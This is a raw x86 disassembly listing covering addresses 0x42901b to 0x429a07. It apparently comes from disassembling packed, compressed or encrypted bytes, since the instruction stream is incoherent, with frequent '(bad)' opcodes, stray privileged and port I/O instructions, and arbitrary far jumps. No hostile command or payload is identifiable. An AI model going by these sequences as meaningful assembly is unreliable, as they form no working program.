  42901b:	jecxz  0x42900c
  42901d:	out    dx,al
  42901e:	arpl   WORD PTR [esi+0x79],cx
  429021:	sbb    DWORD PTR [esp+eax*8-0xb],ebx
  429025:	mov    ds:0x1b614,al
  42902a:	pop    es
  42902b:	add    DWORD PTR [eax],eax
  42902d:	add    ch,bl
  42902f:	scas   eax,DWORD PTR es:[edi]
  429030:	lods   al,BYTE PTR ds:[esi]
  429031:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429032:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429033:	bound  ebp,QWORD PTR [eax]
  429035:	jge    0x42904a
  429037:	xchg   ebx,eax
  429038:	(bad)  
  42903a:	xchg   edi,eax
  42903b:	mov    bl,0xa5
  42903d:	aaa    
  42903e:	cs jne 0x429008
  429041:	pop    ds
  429042:	bound  ecx,QWORD PTR [ecx-0x25b66b2a]
  429048:	fisttp WORD PTR [edi-0x51]
  42904b:	add    eax,0x1e1d760
  429050:	pushf  
  429051:	retf   
  429052:	mov    ah,0x9b
  429054:	rcl    dl,0x68
  429057:	xor    eax,0xf1f10498
  42905c:	out    dx,eax
  42905d:	sbb    BYTE PTR [ebx-0x70],bh
  429060:	pop    ds
  429061:	jae    0x429089
  429063:	xlat   BYTE PTR ds:[ebx]
  429064:	mov    si,0x6221
  429068:	pop    ecx
  429069:	xchg   esi,eax
  42906a:	xor    al,0xca
  42906c:	int3   
  42906d:	adc    ebx,ecx
  42906f:	add    al,0xa8
  429071:	adc    al,0x7e
  429073:	or     al,0x17
  429075:	loope  0x4290f6
  429077:	pushf  
  429078:	mov    ds:0x5e080b7d,eax
  42907d:	mov    bh,cl
  42907f:	stos   BYTE PTR es:[edi],al
  429080:	add    BYTE PTR [ebx+0x13ce2e0e],dl
  429086:	adc    si,WORD PTR [eax+edx*2]
  42908a:	pushf  
  42908b:	bound  esp,QWORD PTR [ecx+0x41d206e0]
  429091:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429092:	cmp    eax,0xcaf307bc
  429097:	xchg   esi,eax
  429098:	or     ch,dl
  42909a:	ror    ebp,cl
  42909c:	repnz mov cl,0x47
  42909f:	jle    0x4290b5
  4290a1:	cmp    eax,0x66f044d7
  4290a6:	sub    BYTE PTR [ebx],ch
  4290a8:	xor    ebp,DWORD PTR [ebx+esi*8-0x5070f157]
  4290af:	mov    eax,ds:0xe0153173
  4290b4:	xchg   DWORD PTR [ecx-0x6c],edx
  4290b7:	cdq    
  4290b8:	mov    ds:0xbfd37eb6,al
  4290bd:	ds scas eax,DWORD PTR es:[edi]
  4290bf:	je     0x429116
  4290c1:	js     0x429057
  4290c3:	retf   
  4290c4:	rcr    DWORD PTR [eax-0x7c],1
  4290c7:	pop    ecx
  4290c8:	sub    al,0x9b
  4290ca:	dec    esi
  4290cb:	push   ebx
  4290cc:	and    DWORD PTR [edi+0x2b],0x804eb73e
  4290d3:	xor    BYTE PTR [ecx+ecx*8],bl
  4290d6:	sbb    ax,0x6bfe
  4290da:	ins    BYTE PTR es:[edi],dx
  4290db:	pop    esp
  4290dc:	xchg   edi,eax
  4290dd:	out    dx,al
  4290de:	push   es
  4290df:	hlt    
  4290e0:	xlat   BYTE PTR ds:[ebx]
  4290e1:	rcl    BYTE PTR [esi-0x29],0x8c
  4290e5:	retf   
  4290e6:	push   ss
  4290e7:	push   ecx
  4290e8:	jp     0x4290ef
  4290ea:	fist   WORD PTR [ecx+edi*1]
  4290ed:	mov    ch,0xe0
  4290ef:	inc    esp
  4290f0:	into   
  4290f1:	retf   0x2331
  4290f4:	mov    eax,DWORD PTR [eax-0x80]
  4290f7:	cwde   
  4290f8:	shr    cl,cl
  4290fa:	jmp    0x17a5:0x3dd21999
  429101:	mov    al,ds:0xf3a8d33
  429106:	sbb    dh,BYTE PTR [ebp+0x12]
  429109:	nop
  42910a:	clc    
  42910b:	sti    
  42910c:	enter  0x760a,0x2a
  429110:	mov    ds:0x5516dec0,al
  429115:	data16 ja 0x429190
  429118:	imul   eax,DWORD PTR [edi-0x7],0x37ad17fd
  42911f:	push   edx
  429120:	jp     0x4290e7
  429122:	dec    esp
  429123:	shr    DWORD PTR [ebx],1
  429125:	cmp    DWORD PTR [ebp+eiz*1-0x3b2cce93],edi
  42912c:	lahf   
  42912d:	and    ah,BYTE PTR [ebx-0x3dc079aa]
  429133:	int3   
  429134:	sub    al,0x0
	...
  429196:	push   esi
  429197:	xchg   ebp,edi
  429199:	test   ch,bh
  42919b:	(bad)  
  42919c:	jg     0x429175
  42919e:	xor    dh,0xd6
  4291a1:	stos   DWORD PTR es:[edi],eax
  4291a2:	adc    al,0xdd
  4291a4:	lock add al,0x1b
  4291a7:	mov    bh,0x1
  4291a9:	add    BYTE PTR [edi],al
  4291ab:	add    DWORD PTR [eax],eax
  4291ad:	add    BYTE PTR [eax],cl
  4291af:	hlt    
  4291b0:	mov    eax,ds:0xbfb9b60b
  4291b5:	pop    ds
  4291b6:	sub    al,0xfd
  4291b8:	xor    al,0x94
  4291ba:	out    dx,eax
  4291bb:	retf   
  4291bc:	jae    0x42915b
  4291be:	(bad)  
  4291bf:	loop   0x4291e9
  4291c1:	add    eax,0xc2668881
  4291c6:	cld    
  4291c7:	and    ch,dh
  4291c9:	in     eax,dx
  4291ca:	popa   
  4291cb:	and    eax,0x9cb874bd
  4291d0:	xchg   esi,eax
  4291d1:	loope  0x429186
  4291d3:	mov    ds:0xf14c0604,eax
  4291d8:	sahf   
  4291d9:	or     DWORD PTR ds:0x31045ab1,esp
  4291df:	aam    0x74
  4291e1:	repz sbb ch,BYTE PTR [ebp+0xebad7eb]
  4291e8:	scas   al,BYTE PTR es:[edi]
  4291e9:	push   ss
  4291ea:	aas    
  4291eb:	jo     0x429242
  4291ed:	stos   BYTE PTR es:[edi],al
  4291ee:	sbb    edx,DWORD PTR [ebp-0x62]
  4291f1:	lods   al,BYTE PTR ds:[esi]
  4291f2:	or     eax,0xdb5af90b
  4291f7:	dec    ebx
  4291f8:	cmp    esp,DWORD PTR [eax-0x6d]
  4291fb:	xrelease xchg BYTE PTR [edx-0x14],al
  4291ff:	cmp    BYTE PTR [ebx+esi*2-0x3],0x12
  429204:	sbb    eax,0x7665d2dd
  429209:	mov    eax,ds:0x9b6554d8
  42920e:	xchg   edi,eax
  42920f:	fs lahf 
  429211:	xchg   ecx,eax
  429212:	fild   DWORD PTR [ebx+edx*2]
  429215:	fiadd  DWORD PTR [edx]
  429217:	imul   edx,DWORD PTR [edi+0x21],0xa8dd5d2
  42921e:	test   al,0xa0
  429220:	sub    al,0x70
  429222:	inc    ecx
  429223:	leave  
  429224:	mov    ah,0x79
  429226:	mov    al,0xf4
  429228:	sub    bl,cl
  42922a:	sub    esp,DWORD PTR [eax+0xd1d3a59]
  429230:	sub    esi,DWORD PTR [ecx+eax*2+0x65b26a00]
  429237:	jmp    0xd1c1:0x3f24ce69
  42923e:	pop    edi
  42923f:	mov    al,ds:0x3cb3f12a
  429244:	xor    edx,edi
  429246:	xor    DWORD PTR [edi],edx
  429248:	mov    dl,0x27
  42924a:	rcl    DWORD PTR [eax+0x5f],1
  42924d:	xlat   BYTE PTR ds:[ebx]
  42924e:	sub    BYTE PTR ds:0xd7a8e2ad,dh
  429254:	sbb    ah,ch
  429256:	repnz clc 
  429258:	adc    eax,0x571362c4
  42925d:	mov    dh,0x80
  42925f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429260:	push   edi
  429261:	add    BYTE PTR [edi-0x23],0xfb
  429265:	movups xmm5,XMMWORD PTR [edi]
  429268:	xor    al,0x25
  42926a:	cmp    ebp,DWORD PTR [edx+0x0]
  42926d:	dec    edx
  42926e:	aad    0xb
  429270:	lahf   
  429271:	jns    0x42920f
  429273:	ds add eax,0xcc0e1b84
  429279:	mov    eax,ecx
  42927b:	cmp    ah,BYTE PTR [ecx]
  42927d:	mov    ds:0x5df46398,al
  429282:	out    dx,eax
  429283:	xchg   ebx,eax
  429284:	fidivr DWORD PTR [esi]
  429286:	mov    ds:0x256920d0,eax
  42928b:	fs into 
  42928d:	cs addr16 mov al,0xbd
  429291:	js     0x429230
  429293:	repz jmp 0x429297
  429296:	fidivr WORD PTR [edx-0x1]
  429299:	test   al,0x15
  42929b:	(bad)  
  42929c:	push   ds
  42929d:	xor    ah,al
  42929f:	inc    ecx
  4292a0:	hlt    
  4292a1:	retf   0x2bb2
  4292a4:	mov    eax,0x7be09bca
  4292a9:	jmp    0x4292ff
  4292ab:	ins    DWORD PTR es:[edi],dx
  4292ac:	out    dx,al
  4292ad:	push   edx
  4292ae:	loopne 0x429326
  4292b0:	xchg   esi,eax
  4292b1:	popa   
  4292b2:	pop    ds
  4292b3:	mov    DWORD PTR [edi+0x0],eax
	...
  429316:	lock adc al,0xe1
  429319:	(bad)  
  42931a:	in     eax,0xff
  42931c:	call   FWORD PTR [esi]
  42931e:	xor    cl,BYTE PTR [ebx-0xc]
  429321:	fs adc eax,0x22c85eb8
  429327:	mov    eax,0x1070001
  42932c:	add    BYTE PTR [eax],al
  42932e:	push   eax
  42932f:	and    DWORD PTR [ebx-0x41dea7d6],0xc4dce1e4
  429339:	stc    
  42933a:	cdq    
  42933b:	outs   dx,BYTE PTR ds:[esi]
  42933c:	rol    DWORD PTR [eax+0x39e1d252],1
  429342:	addr16 mov al,ds:0xaac2
  429346:	pop    eax
  429347:	mov    cl,0x8
  429349:	xchg   edx,eax
  42934a:	fbstp  TBYTE PTR [edx+0x1]
  42934d:	ret    
  42934e:	xor    BYTE PTR ds:0x5569b2e,bh
  429354:	xchg   DWORD PTR [edx],eax
  429356:	pop    edi
  429357:	or     BYTE PTR [eax],dh
  429359:	ret    
  42935a:	push   0xfffffffc
  42935c:	push   esi
  42935d:	lock pusha 
  42935f:	rcl    BYTE PTR [si-0x7d72],1
  429364:	or     eax,0xc564cc5b
  429369:	and    dl,ah
  42936b:	jmp    0x4292f1
  42936d:	jae    0x42930c
  42936f:	mov    ds:0x27637d46,al
  429374:	and    edi,0x3b2b9152
  42937a:	xor    al,0x46
  42937c:	push   es
  42937d:	xlat   BYTE PTR ds:[ebx]
  42937e:	adc    eax,0xdf350329
  429383:	fsubr  DWORD PTR [ebx+0x2e6e25c2]
  429389:	jae    0x429330
  42938b:	pop    es
  42938c:	js     0x42937f
  42938e:	push   ds
  42938f:	dec    esi
  429390:	cmp    eax,0x450f85e4
  429395:	dec    DWORD PTR [edi-0x51]
  429398:	push   esp
  429399:	jne    0x429415
  42939b:	es xchg esi,eax
  42939d:	sbb    DWORD PTR [edi-0x25],edi
  4293a0:	mov    esi,ebp
  4293a2:	pop    esi
  4293a3:	int    0x59
  4293a5:	mov    edx,esi
  4293a7:	data16 cmp al,0xf5
  4293aa:	out    dx,al
  4293ab:	inc    edx
  4293ac:	xor    esi,DWORD PTR [ebx+0x2a]
  4293af:	jp     0x42940a
  4293b1:	dec    edi
  4293b2:	sti    
  4293b3:	mov    al,0xc0
  4293b5:	push   esp
  4293b6:	jns    0x429401
  4293b8:	dec    edi
  4293b9:	(bad)  
  4293ba:	ds out 0xcf,eax
  4293bd:	call   0xe828:0xa524875
  4293c4:	inc    ebp
  4293c5:	(bad)  
  4293c6:	cmp    esp,ecx
  4293c8:	popf   
  4293c9:	icebp  
  4293ca:	arpl   WORD PTR [eax+0x6b],sp
  4293cd:	fnstenv ds:0xa2daa288
  4293d3:	loopne 0x4293e5
  4293d5:	sti    
  4293d6:	test   esi,eax
  4293d8:	arpl   WORD PTR [esi],cx
  4293da:	aam    0xdc
  4293dc:	outs   dx,DWORD PTR ds:[esi]
  4293dd:	mov    ecx,0x16bbc332
  4293e2:	shl    DWORD PTR [ecx+ecx*1],0x74
  4293e6:	lea    esp,[ebx-0x3c]
  4293e9:	loope  0x4293ec
  4293eb:	into   
  4293ec:	leave  
  4293ed:	rcr    esp,1
  4293ef:	sub    eax,0x6d85f221
  4293f4:	mov    bh,0xd3
  4293f6:	shl    al,0xae
  4293f9:	(bad)  
  4293fa:	(bad)  
  4293fb:	cmc    
  4293fc:	lea    esp,[ebx-0x3d]
  4293ff:	test   eax,0xe783bde4
  429404:	jecxz  0x42945f
  429406:	retf   0x25f7
  429409:	push   0x7e
  42940b:	out    0x76,eax
  42940d:	jmp    FWORD PTR [ebx-0x5a]
  429410:	mov    ch,0xb4
  429412:	add    DWORD PTR [edx+0x6d7a6191],ecx
  429418:	xor    ebp,DWORD PTR [ebp-0x2f]
  42941b:	xlat   BYTE PTR ds:[ebx]
  42941c:	sub    DWORD PTR [ecx+0x2f42277d],ebp
  429422:	dec    eax
  429423:	jb     0x4293d5
  429425:	imul   ebx,DWORD PTR [edi+esi*8-0x26ab9b7],0x276cd5b9
  429430:	dec    ebp
  429431:	arpl   WORD PTR [ebx-0x2c],bx
  429434:	sbb    al,0x0
	...
  429496:	dec    esp
  429497:	or     eax,0x3e532c13
  42949c:	jg     0x42950b
  42949e:	adc    al,0xa9
  4294a0:	outs   dx,DWORD PTR ds:[esi]
  4294a1:	xlat   BYTE PTR ds:[ebx]
  4294a2:	sub    ah,BYTE PTR [edi-0x57]
  4294a5:	sub    WORD PTR [ecx+0x1070001],di
  4294ac:	add    BYTE PTR [eax],al
  4294ae:	or     edx,DWORD PTR [edi+0x2c]
  4294b1:	push   cs
  4294b2:	das    
  4294b3:	sbb    bh,cl
  4294b5:	xor    al,bh
  4294b7:	jecxz  0x429511
  4294b9:	cwde   
  4294ba:	cs hlt 
  4294bc:	outs   dx,BYTE PTR ds:[esi]
  4294bd:	int    0x9e
  4294bf:	mov    BYTE PTR [ecx+0x37a2708a],ch
  4294c5:	add    bh,BYTE PTR [ebp-0x2be3ef3]
  4294cb:	int3   
  4294cc:	retf   0xf646
  4294cf:	nop
  4294d0:	loope  0x429458
  4294d2:	imul   ebx,esp,0x1fe418bd
  4294d8:	std    
  4294d9:	push   edx
  4294da:	stos   DWORD PTR es:[edi],eax
  4294db:	arpl   bx,si
  4294dd:	xchg   cl,bh
  4294df:	in     al,dx
  4294e0:	cdq    
  4294e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4294e2:	pushaw 
  4294e4:	push   es
  4294e5:	pop    es
  4294e6:	test   eax,0x65d43611
  4294eb:	cmc    
  4294ec:	fs dec esi
  4294ee:	enter  0x96fe,0xf0
  4294f2:	icebp  
  4294f3:	test   DWORD PTR [ebp+0x38df6e8e],edx
  4294f9:	add    al,0x6a
  4294fb:	call   0x2f81:0xec697d07
  429502:	push   esp
  429503:	sbb    al,0x10
  429505:	popf   
  429506:	sub    al,0x38
  429508:	inc    ebx
  429509:	or     BYTE PTR [si],bl
  42950c:	or     eax,0xb2528925
  429511:	inc    ecx
  429512:	adc    bl,BYTE PTR [ecx]
  429514:	iret   
  429515:	cdq    
  429516:	mov    edi,0xfb6fb517
  42951b:	jecxz  0x429513
  42951d:	sub    BYTE PTR [ecx-0x1c5434e7],cl
  429523:	jge    0x429547
  429525:	stos   BYTE PTR es:[edi],al
  429526:	cwde   
  429527:	jl     0x42953b
  429529:	sub    esi,DWORD PTR [ecx]
  42952b:	inc    eax
  42952c:	mov    esp,0x21d3ac7e
  429531:	jg     0x42956b
  429533:	imul   ebx,ebp,0x7501d8ed
  429539:	mov    bh,0x42
  42953b:	fld    DWORD PTR [eax-0x76ab350a]
  429541:	loop   0x429545
  429543:	jmp    ebx
  429545:	cmp    dl,ch
  429547:	adc    BYTE PTR [esi+eiz*1],dh
  42954a:	xchg   ebp,eax
  42954b:	fadd   DWORD PTR [ecx+0x56]
  42954e:	sub    dh,BYTE PTR [edi-0x3d]
  429551:	inc    esp
  429552:	sub    esp,DWORD PTR [eax+0x5e]
  429555:	scas   al,BYTE PTR es:[edi]
  429556:	push   edx
  429557:	(bad)  
  42955a:	das    
  42955b:	inc    edi
  42955c:	leave  
  42955d:	mov    ds:0xb6f64e69,al
  429562:	popf   
  429563:	shl    DWORD PTR [ebx],0x95
  429566:	hlt    
  429567:	pop    ebx
  429568:	shr    ch,0x92
  42956b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42956c:	popf   
  42956d:	shr    BYTE PTR [ecx+ebx*8],0x65
  429571:	lods   al,BYTE PTR ds:[esi]
  429572:	jns    0x4295ea
  429574:	push   cs
  429575:	cmc    
  429576:	retf   
  429577:	test   cl,dh
  429579:	test   eax,0xa226e4e9
  42957e:	jg     0x4295c3
  429580:	(bad)  
  429582:	mov    dh,0x5e
  429584:	shr    BYTE PTR [esi-0x79],cl
  429587:	xchg   esp,eax
  429588:	adc    DWORD PTR [edx],ebx
  42958a:	rol    DWORD PTR [esi],1
  42958c:	(bad)  
  42958d:	in     al,0x92
  42958f:	and    DWORD PTR [eax-0x45],esi
  429592:	fisub  DWORD PTR [edx-0x2cb8fbc8]
  429598:	mov    bl,0x20
  42959a:	jge    0x429527
  42959c:	aam    0x6d
  42959e:	inc    edi
  42959f:	fs scas eax,DWORD PTR es:[edi]
  4295a1:	scas   eax,DWORD PTR es:[edi]
  4295a2:	mov    bh,0xad
  4295a4:	call   0x49e77e0e
  4295a9:	cli    
  4295aa:	int3   
  4295ab:	pop    esi
  4295ac:	loop   0x429578
  4295ae:	bound  esp,QWORD PTR [ebx-0x1]
  4295b1:	pop    es
  4295b2:	in     al,0x44
  4295b4:	fadd   QWORD PTR [eax]
	...
  429616:	ins    DWORD PTR es:[edi],dx
  429617:	sbb    eax,0xfbf6c0e6
  42961c:	outs   dx,DWORD PTR ds:[esi]
  42961d:	mov    ebp,0x8523ba9d
  429622:	xchg   ecx,eax
  429623:	mov    dh,0xfb
  429625:	dec    edi
  429626:	xor    BYTE PTR [edx+0x1070001],bh
  42962c:	add    BYTE PTR [eax],al
  42962e:	add    eax,0x86b05bbe
  429633:	pop    esi
  429634:	je     0x4296b2
  429636:	daa    
  429637:	js     0x42962e
  429639:	mov    ebx,0x2f869a4c
  42963e:	push   esp
  42963f:	xor    eax,0xd28cd7bd
  429644:	xlat   BYTE PTR ds:[ebx]
  429645:	cmp    ebx,ebx
  429647:	push   edx
  429648:	loopne 0x4295fd
  42964a:	or     al,ch
  42964c:	sub    al,0xbc
  42964e:	mov    ebp,0x73272beb
  429653:	icebp  
  429654:	pop    esp
  429655:	ds dec esp
  429657:	or     dh,BYTE PTR [ebp+0x73dc4f8e]
  42965d:	xor    DWORD PTR [ecx+edi*4-0x13],ebp
  429661:	in     al,0x99
  429663:	mov    eax,0x3ff31089
  429668:	or     eax,0x9179f4bc
  42966d:	es call 0x6e42b802
  429673:	jmp    0x4296de
  429675:	rcl    DWORD PTR [edx+0x5bfb7162],cl
  42967b:	pop    esi
  42967c:	dec    ebp
  42967d:	out    0x1d,al
  42967f:	retf   0x9999
  429682:	sbb    al,0x3a
  429685:	pop    ss
  429686:	inc    ecx
  429687:	aam    0x6c
  429689:	out    0x39,al
  42968b:	add    eax,0x9ab22f1d
  429690:	mov    ch,0x28
  429692:	(bad)  
  429693:	mov    ebx,0xfa6b746c
  429698:	ins    BYTE PTR es:[edi],dx
  429699:	adc    DWORD PTR [eax-0x4e5ee9be],0xffffffe6
  4296a0:	cli    
  4296a1:	pop    es
  4296a2:	inc    ebp
  4296a3:	test   eax,0x2f72287b
  4296a8:	mov    ah,0xb5
  4296aa:	call   0x2e2a:0x75aa4f3d
  4296b1:	jmp    0x4296c0
  4296b3:	mov    ecx,0x3dc0473
  4296b8:	fisttp WORD PTR [esi]
  4296ba:	test   eax,0x6d6894bd
  4296bf:	(bad)  
  4296c0:	jp     0x429695
  4296c2:	pushf  
  4296c3:	es push esp
  4296c5:	xor    ah,BYTE PTR [ebx+ecx*8-0x2022f832]
  4296cc:	xchg   edx,eax
  4296cd:	mov    al,ds:0x5a04220f
  4296d2:	aam    0x45
  4296d4:	aam    0x60
  4296d6:	push   dx
  4296d8:	cli    
  4296d9:	sub    bh,0x49
  4296dc:	add    BYTE PTR [ebx],al
  4296de:	daa    
  4296df:	das    
  4296e0:	mov    ah,0x24
  4296e2:	and    BYTE PTR ds:0x56475a9b,ch
  4296e8:	push   es
  4296e9:	sub    esp,edx
  4296eb:	in     eax,dx
  4296ec:	mov    dh,0xa9
  4296ee:	or     al,0x7a
  4296f0:	ins    DWORD PTR es:[edi],dx
  4296f1:	into   
  4296f2:	xor    BYTE PTR [ecx-0x56f4e247],ah
  4296f8:	inc    eax
  4296f9:	lods   al,BYTE PTR ds:[esi]
  4296fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4296fb:	add    DWORD PTR [edi+0x7e],eax
  4296fe:	jno    0x429682
  429700:	nop
  429701:	and    al,0x52
  429703:	lods   eax,DWORD PTR ds:[esi]
  429704:	nop
  429705:	pop    esi
  429706:	lods   al,BYTE PTR ds:[esi]
  429707:	push   ebx
  429708:	add    BYTE PTR [esi+0x4a],dl
  42970b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42970c:	mov    DWORD PTR [ebx-0x42f243d5],ebx
  429712:	sbb    DWORD PTR [ebx],esp
  429714:	add    eax,0x15ce9888
  429719:	lea    esp,[ecx]
  42971b:	add    DWORD PTR [eax],ebx
  42971d:	lds    esp,FWORD PTR [edi-0x7]
  429720:	or     bl,BYTE PTR [esi]
  429722:	xchg   al,ah
  429724:	lods   al,BYTE PTR ds:[esi]
  429725:	or     bl,BYTE PTR [edx+0x15]
  429728:	dec    esp
  429729:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42972a:	in     al,0xe
  42972c:	jnp    0x4296e9
  42972e:	inc    esp
  42972f:	shl    eax,cl
  429731:	loop   0x4296e9
  429733:	push   ebx
  429734:	in     eax,0x0
	...
  429796:	xor    BYTE PTR [edx-0x21],al
  429799:	(bad)  
  42979a:	(bad)  
  42979b:	(bad)  
  42979c:	mov    ebp,0x1396252
  4297a1:	bswap  esi
  4297a3:	jno    0x42974c
  4297a5:	add    dh,BYTE PTR [edi]
  4297a7:	mov    ebx,0x1070001
  4297ac:	add    BYTE PTR [eax],al
  4297ae:	ror    DWORD PTR [eax+0x7f6c4b81],1
  4297b4:	cmp    eax,0x98d3a873
  4297b9:	loop   0x429756
  4297bb:	mov    WORD PTR [ecx-0x61],ds
  4297be:	sbb    DWORD PTR [edx-0x289b471f],esi
  4297c4:	stc    
  4297c5:	mov    al,0x33
  4297c7:	repnz lods al,BYTE PTR ds:[esi]
  4297c9:	and    ebx,DWORD PTR [edi+0x1e]
  4297cc:	das    
  4297cd:	popa   
  4297ce:	lea    esp,[esi+ecx*1-0xfe73653]
  4297d5:	addr16 pushf 
  4297d7:	mov    edx,0xf7c23e04
  4297dc:	(bad)  
  4297dd:	mov    WORD PTR [esi+0x3f9df5b0],gs
  4297e3:	sub    DWORD PTR [edx],0x9
  4297e6:	jg     0x429803
  4297e8:	or     eax,DWORD PTR [ebx+0x54]
  4297eb:	daa    
  4297ec:	out    0x1e,al
  4297ee:	cmc    
  4297ef:	add    ebp,DWORD PTR [esi+ebx*8]
  4297f2:	and    al,0x77
  4297f4:	dec    esi
  4297f5:	pop    ecx
  4297f6:	daa    
  4297f7:	popa   
  4297f8:	lods   al,BYTE PTR ds:[esi]
  4297f9:	repz (bad) 
  4297fb:	xor    al,0x94
  4297fd:	mov    bl,0xba
  4297ff:	push   cs
  429800:	les    edi,FWORD PTR [esi+0x680623d8]
  429806:	mov    dh,0xf7
  429808:	push   eax
  429809:	sar    dh,1
  42980b:	sbb    eax,DWORD PTR [ebp-0x2a]
  42980e:	in     al,0x68
  429810:	mov    ecx,0x81a9a792
  429815:	jmp    0x95cc502c
  42981a:	or     bl,bh
  42981c:	outs   dx,DWORD PTR ds:[esi]
  42981d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42981e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42981f:	data16 mov ah,BYTE PTR [ebx+0x75139065]
  429826:	cmp    eax,0x27f7e017
  42982b:	xchg   BYTE PTR [ecx+0x2],dl
  42982e:	push   eax
  42982f:	mov    eax,ds:0x4ab46d23
  429834:	adc    edi,DWORD PTR [ebp+0x277e3a06]
  42983a:	and    bh,0x87
  42983d:	je     0x4297d1
  42983f:	les    ebx,FWORD PTR [ebp+ebx*1+0x65]
  429843:	scas   al,BYTE PTR es:[edi]
  429844:	inc    esp
  429845:	or     al,0x11
  429847:	es mov ch,0xd1
  42984a:	jge    0x429870
  42984c:	adc    eax,0x44d5b875
  429851:	std    
  429852:	ja     0x42983d
  429854:	mov    ah,0x19
  429856:	iret   
  429857:	je     0x4297ea
  429859:	aad    0xc8
  42985b:	rol    DWORD PTR [ebx],cl
  42985d:	aad    0xd3
  42985f:	inc    ecx
  429860:	out    0x89,eax
  429862:	out    0xff,eax
  429864:	cmp    eax,0x55839e83
  429869:	or     cl,BYTE PTR [esi-0x63e15e99]
  42986f:	sbb    al,0x7a
  429871:	add    dl,bh
  429873:	and    eax,0xdee2d384
  429878:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429879:	(bad)  
  42987a:	(bad)  
  42987b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42987c:	mov    fs,WORD PTR ds:0x7e1cf47
  429882:	xlat   BYTE PTR ds:[ebx]
  429883:	shl    ah,1
  429885:	mov    ebp,0xba446918
  42988a:	stos   BYTE PTR es:[edi],al
  42988b:	nop
  42988c:	xchg   edi,eax
  42988d:	sahf   
  42988e:	xchg   BYTE PTR [esi+0x50],bh
  429891:	addr16 inc esp
  429893:	cli    
  429894:	fcmovnbe st,st(2)
  429896:	and    al,0x21
  429898:	(bad)
  42989c:	test   ch,bh
  42989e:	int    0xe0
  4298a0:	sar    al,1
  4298a2:	jp     0x429914
  4298a4:	enter  0x83f3,0x46
  4298a8:	and    al,0x92
  4298aa:	jl     0x42985e
  4298ac:	pop    esi
  4298ad:	sub    BYTE PTR [ebp+0x3c32d7b2],dh
  4298b3:	dec    edi
  4298b4:	lock add BYTE PTR [eax],al
	...
  429913:	add    BYTE PTR [eax],al
  429915:	add    BYTE PTR [edi+0x68],dl
  429918:	fistp  QWORD PTR fs:[edi-0x21]
  42991c:	(bad)  
  42991d:	call   0x449747d3
  429922:	repz mov esp,0xbc3e893a
  429928:	add    DWORD PTR [eax],eax
  42992a:	pop    es
  42992b:	add    DWORD PTR [eax],eax
  42992d:	add    BYTE PTR [edi],bl
  42992f:	xchg   edi,eax
  429930:	bound  ebp,QWORD PTR [ecx]
  429932:	mov    cl,0xdf
  429934:	(bad)  
  429935:	bsf    edx,DWORD PTR [ecx+0x3e]
  429939:	leave  
  42993a:	in     eax,0x15
  42993c:	repnz mov al,ds:0xa2cece6f
  429942:	mov    ecx,0x86fdf556
  429947:	mov    esi,0xeb4dcde9
  42994c:	jl     0x42997b
  42994e:	pop    eax
  42994f:	jge    0x42990a
  429951:	aam    0x1b
  429953:	test   eax,0x6fb35baf
  429958:	sahf   
  429959:	inc    edx
  42995a:	push   ss
  42995b:	loop   0x4298f3
  42995d:	jp     0x4299be
  42995f:	dec    edi
  429960:	or     DWORD PTR [edi],0x270b8e1c
  429966:	or     BYTE PTR [ebp-0x40],ah
  429969:	jecxz  0x4298f4
  42996b:	outs   dx,DWORD PTR ds:[esi]
  42996c:	push   ebp
  42996d:	inc    esi
  42996e:	pusha  
  42996f:	dec    ebp
  429970:	or     al,0x46
  429972:	push   ecx
  429973:	mov    ecx,0xfecf4044
  429978:	or     DWORD PTR [ebx-0x580f841c],ebp
  42997e:	push   ebp
  42997f:	jle    0x42995e
  429981:	and    ah,ah
  429983:	aam    0xca
  429985:	mov    BYTE PTR [ebx-0x7f],ah
  429988:	cmc    
  429989:	pop    esi
  42998a:	scas   al,BYTE PTR es:[edi]
  42998b:	iret   
  42998c:	retf   
  42998d:	and    edx,DWORD PTR [ebx-0x7ca3a9c8]
  429993:	push   ds
  429994:	adc    eax,0x7c13ef70
  429999:	push   ebx
  42999a:	retf   0x671b
  42999d:	push   eax
  42999e:	or     dl,BYTE PTR [eax+0x34]
  4299a1:	neg    BYTE PTR [edi-0x3c]
  4299a4:	lods   eax,DWORD PTR ds:[esi]
  4299a5:	dec    esi
  4299a6:	and    BYTE PTR [ecx-0x696d47fe],bh
  4299ac:	lahf   
  4299ad:	add    al,0x2f
  4299af:	or     eax,0xd2742d68
  4299b4:	sahf   
  4299b5:	pop    esi
  4299b6:	cdq    
  4299b7:	ret    
  4299b8:	mov    ebx,0xd3200411
  4299bd:	mov    esp,0x56905871
  4299c2:	add    ch,0xc3
  4299c5:	jg     0x429980
  4299c7:	lds    ebp,FWORD PTR [ebp-0x4]
  4299ca:	in     al,0x44
  4299cc:	in     al,0xb8
  4299ce:	and    ecx,DWORD PTR [ecx+0x1d]
  4299d1:	pop    ds
  4299d2:	xor    bl,BYTE PTR [ebx+0x43]
  4299d5:	jbe    0x42998f
  4299d7:	mov    WORD PTR [edi+edi*2],?
  4299da:	hlt    
  4299db:	mov    dl,0xf2
  4299dd:	fwait
  4299de:	adc    ch,dh
  4299e0:	pushf  
  4299e1:	lods   al,BYTE PTR ds:[esi]
  4299e2:	mov    ch,0xce
  4299e4:	pusha  
  4299e5:	mov    esi,0xd5941d50
  4299ea:	sub    DWORD PTR [esi-0x1f],edx
  4299ed:	xchg   esp,eax
  4299ee:	std    
  4299ef:	jp     0x42997a
  4299f1:	mov    cl,0x13
  4299f3:	in     al,0xfa
  4299f5:	dec    edi
  4299f6:	jmp    0xb745:0x3df8d2ce
  4299fd:	pop    fs
  4299ff:	pop    ss
  429a00:	rol    BYTE PTR [ebx],cl
  429a02:	mov    BYTE PTR [edx-0x62],ch
  429a05:	pop    edx
  429a06:	lods   al,BYTE PTR ds:[esi]
  429a07:	mov    WORD PTR [ecx],es
